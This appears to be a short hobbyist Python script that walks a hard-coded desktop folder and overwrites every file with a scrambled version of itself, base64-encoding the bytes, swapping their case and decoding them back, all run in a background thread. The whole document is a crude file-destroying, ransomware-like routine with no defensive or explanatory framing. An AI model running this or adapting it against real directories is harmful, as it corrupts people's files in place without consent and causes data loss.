import base64
import threading
import os
def nouhack():
    for root, dirs, files in os.walk("/home/nouhack/Desktop/nouhacknouhacknouhack"):  
        for file in files:
            p=(root+'/'+file)
            with open(p,"rb") as image :
                encode1=base64.b64encode(image.read())
            t=encode1.swapcase()
            imagdate=base64.b64decode(t)
            with open(p,"wb") as f:
                f.write(imagdate)

t1=threading.Thread(target=nouhack)
t1.start()

        
 
